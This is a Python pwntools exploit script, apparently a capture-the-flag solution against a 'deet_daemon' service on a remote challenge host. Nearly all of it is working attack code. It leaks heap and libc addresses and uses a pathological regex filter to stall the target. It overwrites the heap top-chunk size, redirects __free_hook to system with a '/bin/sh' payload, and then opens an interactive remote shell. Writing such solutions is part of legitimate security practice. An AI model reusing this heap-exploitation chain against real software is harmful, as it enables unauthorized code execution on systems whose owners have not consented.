#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mc.ax --port 30283 deet_daemon
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('sice_supervisor')
child = ELF('deet_daemon')
libc = ELF('libs/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 30283)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./libs/'

class Daemon:
    def __init__(self, io):
        self.io = io
        self.io.sendlineafter(b'> ', b'1')
        self.io.recvuntil(b'Created deet ')
        self.index = int(self.io.recvuntil(b'\n', drop=True))

    def sice(self, string):
        self.io.sendlineafter(b'> ', b'2')
        self.io.sendlineafter(b'> ', str(self.index).encode())
        self.io.sendafter(b'> ', string)

    def filter(self, string):
        self.io.sendlineafter(b'> ', b'3')
        self.io.sendlineafter(b'> ', str(self.index).encode())
        self.io.sendlineafter(b'> ', string)

    def add_deet(self, size):
        self.sice(b'1\n')
        self.sice(f'{size}\n'.encode())

    def remove_deet(self, index):
        self.sice(b'2\n')
        self.sice(f'{index}\n'.encode())

    # requires sice after
    def edit_deet(self, index):
        self.sice(b'3\n')
        self.sice(f'{index}\n'.encode())

    def view_deet(self, index):
        self.sice(b'4\n')
        self.sice(f'{index}\n'.encode())

    def sync(self):
        daemon.view_deet(-1)
        res = self.io.recvuntil(b'Invalid index!\n', drop=True)
        self.io.unrecv(b'> ')
        return res
    
    def leak(self, index):
        self.view_deet(index)
        pre = self.io.recvuntil(b'Viewing deet\n')
        res = unpack(self.io.recvuntil(b'\nDone!\n', drop=True), 'all')
        self.io.unrecv(b'> ')
        return res

io = start()

daemon = Daemon(io)

daemon.add_deet(0x5e8)
daemon.add_deet(0x18)
daemon.add_deet(0x18)
daemon.remove_deet(0)
daemon.add_deet(3)
daemon.edit_deet(0)
daemon.sice(b'A' * 3 + b'\n')
arena = daemon.leak(0) & 0xffffffffff000000
log.info(f"arena: {hex(arena)}")

daemon.add_deet(100000)
daemon.edit_deet(3)
for _ in range(98):
    daemon.sice(b'A' * 1000)
daemon.sice(b'A' * 999 + b'\n')
daemon.add_deet(0x7c8)
daemon.sync()
daemon.filter(b"(?:){50000000}")
daemon.view_deet(3)
daemon.view_deet(3)
payload = flat({
    0x638: 0xffffffffffffffff,
})
daemon.edit_deet(4)
daemon.sice(payload[:1000])
daemon.sice(payload[1000:] + b'\n')
daemon.remove_deet(4)
daemon.add_deet(0x638)

daemon.sync()
top = 0x19e30
target = 0x880
size = ((target - top) % 2**64) - 8
daemon.add_deet(size)
daemon.add_deet(0x6f8)
daemon.add_deet(0x5c0)
libc.address = daemon.leak(6) - 0x3ebc40
log.info(f"libc: {hex(libc.address)}")

daemon.add_deet(0xa8)
daemon.sync()
daemon.filter(b"(?:){50000000}")
daemon.view_deet(3)
daemon.view_deet(3)
target = libc.symbols['__free_hook'] - 8
top = arena + 0xfd0
size = ((target - top) % 2**64) - 8
payload = flat({
    0x0: b'/bin/sh\x00',
    0x48: size + 8 + libc.symbols['system'],
})
daemon.edit_deet(8)
daemon.sice(payload + b'\n')
daemon.remove_deet(8)
daemon.add_deet(0x48)
daemon.sync()
daemon.add_deet(size)
daemon.remove_deet(8)
daemon.sync()

while True:
    cmd = input('$ ')
    if cmd.strip() == 'exit':
        break
    daemon.sice(cmd.encode() + b'\n')
    io.recvuntil(b'> ')
    print(io.recv(timeout=3).decode('utf-8', 'backslashreplace'), end='')
    io.unrecv(b'> ')

io.interactive()
